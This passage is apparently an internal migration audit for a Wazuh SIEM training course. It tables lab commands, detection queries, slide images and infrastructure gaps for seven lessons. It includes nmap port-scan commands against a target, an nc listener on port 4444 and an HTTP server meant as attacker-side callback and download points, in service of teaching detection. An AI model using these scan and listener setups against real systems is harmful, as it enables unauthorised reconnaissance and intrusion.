| Index `wazuh-archives-*` holding individual drops | Q10-05, D10-01, blind box | unverified — looks empty | `wazuh-archives-4.x-*` returned 0 documents for any query over 7 days although `logall_json` is `yes` |
| `Indexer management · Dev Tools` in the Dashboard | D10-01 | unverified | availability under `https://<core>/siem/` and learner permission not checked |
| File `examples/rev01/chapter10/D10-01.json` | prose | missing | no such path in the course directory (course has `assets`, `course.json`, `lessons`, `scenarios.json`, `source-map.json`) |
| `timestamp` field for range/min/max | D10-01 | same | alerts carry `timestamp` |
| Cross-references: 1.9 C01-24, 4.4, 6.6, case 16 (SSH) | C10-08, Q10-05, prose, slide p.332 | — | other lessons |
| "Wazuh journald 수집기는 커널 메시지를 가져오지 않아 kern.log 를 따로 읽는다" | slide p.339 | missing | old-host explanation |
| Slide capture text "kt66 호스트 경계 방화벽", `ccc.com (192.168.0.189)` | slide p.333 image | — | internal code name visible |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C10-07 | lab host | `sudo iptables -S xocrange-PERIMETER` | no — tool/feature missing (nftables in the fw container; no learner access as specified). Not possible on the office PC (no packet filter, no NET_ADMIN) |
| C10-08 | attacker VM | `nmap --version` | yes (version text changes) |
| C10-09 | attacker VM | `date`, `nmap -sT -Pn -n -p 1-1000 --max-retries 1 <target>` | runs, but against `<core address>` it does not exercise the lab firewall as the lesson expects |
| C10-10 | lab host | `sudo grep … /var/log/kern.log` | no — file and host shell missing; raw records are NFLOG output of the fw container |
| slide p.333 | attacker VM | `nmap -sT -Pn -p 1-1000 --max-retries 1 192.168.0.189` | as C10-09 |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q10-04 | alerts | `agent.name: "xocrange-host"`, `rule.id: "4151"` | not as written. After rename to `xoc-manager`/location filter: unverified — rule exists, but no firewall alert has been produced in 7 days and it is unknown whether a scan can produce ≥18 logged drops with one source address |
| Q10-05 | archives | `agent.name`, `location: "/var/log/kern.log"`, `data.action: "DROP"`, `data.srcip` | no — location renamed, archives index returned 0 documents |
| D10-01 | archives (Dev Tools `_search`) | `agent.name`, `data.srcip`, `data.action`, `timestamp`; aggs on `data.dstport` | no — same reasons; Dev Tools access unverified |
| slide p.335 | alerts | `rule.id:4151 OR (rule.groups:firewall_drop AND data.srcip:*)`, `data.dstport`, `data.action` | unverified (0 today) |

**5. Images.** Slides 4 (1 terminal, 3 Discover; old lab). Manuscript 2, both `screens` (`chapter10/firewall.png`, `chapter10/archives.png`). Diagrams: 0 (concept pages p.330-331 are text only).

**6. Blocking gaps.**
- A scan path that actually crosses the lab firewall with a stable, attributable source: e.g. a forwarded port range or a scan origin on the ext network (10.20.30.0/24). Today there is no attacker host inside the lab and the external VM only reaches published host ports.
- A way for the learner to read the firewall rules (UI view or read-only shell in the fw container).
- Proof that fw NFLOG DROP records reach the Manager, decode with `data.action/srcip/dstport`, and trigger 4101 → 4151 (none seen in 7 days).
- A populated archives index (0 documents seen) and Dev Tools access.
- Rewrite of the rate-limit reasoning (10/s burst 20 instead of 100/s burst 200): at that rate a 5-second scan logs only about 70 drops, still enough for 4151 (18 in 45 s).

---

## Image totals

| Lesson | Slide images | Manuscript images (path has `screens`) | Diagrams / illustrations |
|---|---|---|---|
| case-24 | 4 | 1 (1) | 0 |
| case-25 | 5 | 1 (1) | 0 |
| case-26 | 4 | 1 (1) | 0 |
| case-27 | 4 | 1 (1) | 0 |
| case-28 | 5 | 2 (2) | 0 |
| case-29 | 4 | 1 (1) | 0 |
| case-30 | 4 | 2 (2) | 0 |
| Total | 30 | 9 (9) | 0 |

Slide image blocks carry only an `asset` hash and alt text "교재 N페이지 예시 화면" (no `path`), so none match `screens` by path, but by content all 30 are captures of the old lab: 8 terminal captures ("실습 ① 공격 실행") and 22 Discover captures ("결과 화면"). Only p.279, p.289 and p.333 were opened; each shows old addresses and the string `kt66`.

---

## Consolidated requirements

### Office PC image

| Requirement | Lessons |
|---|---|
| `netcat-openbsd` (`nc`, `nc.openbsd`, `-N`, `-lk`) | 25, 29 |
| `net-tools` (`netstat`) for command monitoring | 29 |
| A regular (non-link) dpkg-owned executable under `/usr/bin` to modify, with `dpkg -V <package>` reporting it — verify `/usr/bin/yes` on Ubuntu 26.04 (Rust coreutils) | 27 |
| `/var/log/btmp` present | 28 |
| cron running at start and `service cron status` answering (or reword C09-17) | 24 |
| `student` able to read `/var/log/syslog` (group `adm`) or use `sudo grep` | 24 |
| A source of process-execution records (auditd execve rule with key `audit-wazuh-c`, or an agreed Sysmon substitute recorded by the host) | 25, 26, 29 |
| osquery with a listening-ports scheduled query (or drop that evidence) | 29 |

### Office PC agent configuration (`components/office-pc/ossec.conf`)

| Requirement | Lessons |
|---|---|
| FIM on `/var/log` with `check_all="no"`, realtime (create/delete only) | 28 |
| `report_changes="yes"` on `/home` (mock history diff) and on `/etc/cron.d` if the slide's `syscheck.diff` claim is kept | 28, 24 |
| FIM on `/var/spool/cron` (slide DQL) | 24 |
| `<localfile>` `full_command` netstat, alias `netstat listening ports`, frequency 360 | 29 |
| `<localfile>` for the audit log (`log_format audit`) if auditd is provided | 25, 26, 29 |
| Existing auth.log + syslog collection and realtime `/etc`, `/usr/bin`, `/usr/sbin`, `/home` (already in the file) | 24, 27, 28 |

### Manager configuration

| Requirement | Lessons |
|---|---|
| Nothing new for FIM rules 550/553/554, sshd 5715, sudo 5402, 591, 533, 4101/4151, 80792 — all present | 24, 27, 28, 29, 30 |
| Audit key → `command` mapping in `etc/lists/audit-keys` for whichever key the execve rule uses (stock list has `audit-wazuh-c`) | 25, 26, 29 |
| Archives index actually populated (`wazuh-archives-4.x-*` returned 0 documents) | 30 (and 28 prose) |
| nftables NFLOG records from the fw container arriving and decoding to `data.action/srcip/dstip/srcport/dstport`, so 4101 → 4151 fires (0 seen in 7 days) | 30 |
| Dev Tools reachable for learners | 30 |
| Decision: teach execution cases with host Sysmon fields (rules 111201/111203, live today) instead of `data.audit.execve.*` | 25, 26, 29 |

### Firewall / network

| Requirement | Lessons |
|---|---|
| A path from the office PC to a listener/downloader: either the attacker VM (new allow rule) or a file/listener behind the web gateway 10.20.32.80:8080 | 25, 26 (and the slide version of 24) |
| A scan that crosses the lab firewall with an identifiable source address, and a statement of what the source looks like after the ingress hop | 30 |
| Learner-readable view of the fw ruleset (`nft list table inet xoc_fw` or UI) | 30, 29 (predict box) |
| Rate-limit text aligned with `limit rate 10/second burst 20` | 30 |

### Attacker side

| Requirement | Lessons |
|---|---|
| `ssh -p 2222 student@<core address>` replaces `ssh -p 2204 ccc@192.168.0.189` and direct `ssh ccc@192.168.0.189` | 24, 25, 26, 27, 28, 29 |
| `nc` listener on 4444 (present) — reachable from the lab only after a network change | 25 |
| `python3 -m http.server 8000` (present) — reachable from the lab only after a network change | 26, 24 slide |
| `nmap` (present; version text 7.80 changes) | 30 |
| No hydra/sqlmap/nikto/gobuster/sshpass needed by these seven lessons | — |

### Content-only items (no infrastructure)

- Replace `bastion`, `xocrange-bastion`, `web`, `xocrange-web`, `xocrange-host`, `ccc`, `/home/ccc`, 192.168.0.189/.202/.108, `ens33`, `Windows · Discover` in all seven lessons.
- Drop C09-18 (apt install) and the "old environment had no cron" remark (24).
- Re-record every "기록에서는 …" value, and all 39 images; three opened slide captures show `kt66`.
- `examples/rev01/chapter10/D10-01.json` is referenced but not shipped (30).
- Slides and manuscript give different command sets per case (24, 25, 27, 28 most visibly); port both or unify.
